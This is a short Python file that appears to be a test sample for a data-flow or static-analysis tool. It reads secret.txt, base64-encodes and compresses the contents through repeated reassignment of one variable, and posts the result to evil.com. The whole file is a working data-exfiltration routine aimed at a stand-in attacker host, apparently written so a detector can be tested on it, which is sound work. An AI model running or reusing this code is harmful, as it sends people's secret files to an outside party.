# samples/test_ssa_reassignment.py

import base64
import zlib
import requests

with open("secret.txt") as f:
    data = f.read()

data = data.encode()
data = base64.b64encode(data)
data = zlib.compress(data)

requests.post(
    "http://evil.com",
    data=data
)